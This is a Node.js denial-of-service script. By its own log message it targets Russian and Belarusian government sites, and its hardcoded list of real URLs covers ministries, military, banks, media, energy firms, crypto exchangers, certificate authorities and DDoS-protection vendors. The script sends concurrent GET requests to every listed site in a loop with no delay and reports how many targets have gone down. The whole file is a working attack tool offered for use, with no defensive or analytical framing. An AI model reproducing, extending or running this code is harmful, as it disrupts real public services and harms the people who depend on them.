const axios = require('axios')

axios.defaults.validateStatus = () => true

const LAST_SUCCESS_RESPONSE_TIMEOUT_IN_SECONDS = 60
const SITE_TIMEOUT_IN_MS = 2000

const targets = [
  'https://www.gazprom.ru/',
  'https://lukoil.ru/',
  'https://magnit.ru/',
  'https://www.nornickel.com/',
  'https://www.surgutneftegas.ru/',
  'https://www.tatneft.ru/',
  'https://www.evraz.com/ru/',
  'https://nlmk.com/',
  'https://www.sibur.ru/',
  'https://www.severstal.com/',
  'https://www.metalloinvest.com/',
  'https://nangs.org/',
  'https://rmk-group.ru/ru/',
  'https://www.tmk-group.ru/',
  'https://ya.ru/',
  'https://www.polymetalinternational.com/ru/',
  'https://www.uralkali.com/ru/',
  'https://www.eurosib.ru/',
  'https://omk.ru/',
  'https://www.sberbank.ru/',
  'https://www.vtb.ru/',
  'https://www.gazprombank.ru/',
  'https://www.gosuslugi.ru/',
  'https://www.mos.ru/uslugi/',
  'http://kremlin.ru/',
  'http://government.ru/',
  'https://mil.ru/',
  'https://www.nalog.gov.ru/',
  'https://customs.gov.ru/',
  'https://pfr.gov.ru/',
  'https://rkn.gov.ru/',

  'https://109.207.1.118/',
  'https://109.207.1.97/',

  'https://mail.rkn.gov.ru/',
  'https://cloud.rkn.gov.ru/',
  'https://mvd.gov.ru/',
  'https://pwd.wto.economy.gov.ru/',
  'https://stroi.gov.ru/',
  'https://proverki.gov.ru/',

  'https://ria.ru/',
  'https://gazeta.ru/',
  'https://kp.ru/',
  'https://riafan.ru/',
  'https://pikabu.ru/',
  'https://kommersant.ru/',
  'https://mk.ru/',
  'https://yaplakal.com/',
  'https://rbc.ru/',
  'https://bezformata.com/',

  'http://belta.by/',
  'https://sputnik.by/',
  'https://www.tvr.by/',
  'https://www.sb.by/',
  'https://belmarket.by/',
  'https://www.belarus.by/',
  'https://belarus24.by/',
  'https://ont.by/',
  'https://www.024.by/',
  'https://www.belnovosti.by/',
  'https://mogilevnews.by/',
  'https://www.mil.by/',
  'https://yandex.by/',
  'https://www.slonves.by/',
  'http://www.ctv.by/',
  'https://radiobelarus.by/',
  'https://radiusfm.by/',
  'https://alfaradio.by/',
  'https://radiomir.by/',
  'https://radiostalica.by/',
  'https://radiobrestfm.by/',
  'https://www.tvrmogilev.by/',
  'https://minsknews.by/',
  'https://zarya.by/',
  'https://grodnonews.by/',
  'https://rec.gov.by/ru/',
  'https://www.mil.by/',
  'https://www.government.by/',
  'https://president.gov.by/ru/',
  'https://www.mvd.gov.by/ru/',
  'https://www.kgb.by/ru/',
  'https://www.prokuratura.gov.by/',
  'https://www.nbrb.by/',
  'https://belarusbank.by/',
  'https://brrb.by/',
  'https://bankdabrabyt.by/',
  'https://belinvestbank.by/',
  'https://bgp.by/ru/',
  'https://www.belneftekhim.by/',
  'https://www.bellegprom.by/',
  'https://www.energo.by/',
  'https://belres.by/ru/',
  'https://mininform.gov.by/',

  'https://www.moex.com',

  'https://www.fsb.ru/',

  'https://cleanbtc.ru/',
  'https://bonkypay.com/',
  'https://changer.club/',
  'https://superchange.net/',
  'https://mine.exchange/',
  'https://platov.co/',
  'https://ww-pay.net/',
  'https://delets.cash/',
  'https://betatransfer.org/',
  'https://ramon.money/',
  'https://coinpaymaster.com/',
  'https://bitokk.biz/',
  'https://www.netex24.net/',
  'https://cashbank.pro/',
  'https://flashobmen.com/',
  'https://abcobmen.com/',
  'https://ychanger.net/',
  'https://multichange.net/',
  'https://24paybank.ne/',
  'https://royal.cash/',
  'https://prostocash.com/',
  'https://baksman.org/',
  'https://kupibit.me/',
  'https://abcobmen.com/',
  'https://www.gosuslugi.ru',

  'https://iecp.ru/ep/ep-verification/',
  'https://iecp.ru/ep/uc-list/',
  'https://uc-osnovanie.ru/',
  'http://www.nucrf.ru/',
  'http://www.belinfonalog.ru/',
  'http://www.roseltorg.ru/',
  'http://www.astralnalog.ru/',
  'http://www.nwudc.ru/',
  'http://www.center-inform.ru/',
  'https://kk.bank/UdTs/',
  'http://structure.mil.ru/structure/uc/info.htm',
  'http://www.ucpir.ru/',
  'http://dreamkas.ru/',
  'http://www.e-portal.ru/',
  'http://izhtender.ru/',
  'http://imctax.parus-s.ru/',
  'http://www.icentr.ru/',
  'http://www.kartoteka.ru/',
  'http://rsbis.ru/elektronnaya-podpis',
  'http://www.stv-it.ru/',
  'http://www.crypset.ru/',
  'http://www.kt-69.ru/',
  'http://www.24ecp.ru/',
  'http://kraskript.com/',
  'http://www.y-center.ru/',
  'http://www.rcarus.ru/',
  'http://rk72.ru/',
  'http://squaretrade.ru/',
  'http://ca.gisca.ru/',
  'http://www.otchet-online.ru/',
  'http://udcs.ru/',
  'http://www.cit-ufa.ru/',
  'http://elkursk.ru/',
  'http://www.icvibor.ru/',
  'http://ucestp.ru/',
  'http://mcspro.ru/',
  'http://www.infotrust.ru/',
  'http://epnow.ru/',
  'http://ca.kamgov.ru/',
  'http://mascom-it.ru',
  'http://cfmc.ru',

  'https://ddos-guard.net/ru',
  'https://stormwall.pro/',
  'https://qrator.net/ru/',
  'https://solidwall.ru/'
]

function isDown (lastSuccessfulResponseTime) {
  const currentTime = Date.now()
  return Math.abs(currentTime - lastSuccessfulResponseTime) > LAST_SUCCESS_RESPONSE_TIMEOUT_IN_SECONDS * 1000
}

async function main () {
  console.log('Starting to DoS russian/belorussian gov sites')

  let totalRequests = 0
  const requests = targets.reduce((res, target) => {
    res[target] = { requests: 0, successfulResponses: 0, lastSuccessfulResponseTime: Date.now() }
    return res
  }, {})

  setInterval(() => {
    const downSites = Object.values(requests).filter(r => isDown(r.lastSuccessfulResponseTime))
    console.log(`Total down sites: ${downSites.length}/${Object.keys(requests).length}`)
    console.log(`Total request count: ${totalRequests}`)
  }, 10000)

  setInterval(async () => {
    // const upSites = Object.entries(requests).reduce((res, [url, value]) => {
    //   if (!isDown(value.lastSuccessfulResponseTime)) res[url] = value
    //   return res
    // }, {})
    const responses = await axios.all(Object.keys(requests).map(url => axios({
      method: 'get',
      timeout: SITE_TIMEOUT_IN_MS,
      url
    }).catch(() => {
      requests[url].requests++
    })))

    totalRequests += responses.length

    responses.forEach(r => {
      if (!r) return

      const url = r.config.url
      requests[url].requests++
      if (r.status === 200) {
        requests[url].successfulResponses++
        requests[url].lastSuccessfulResponseTime = Date.now()
      }
    })

  }, 0)
}

main().catch(e => console.log(e.stack))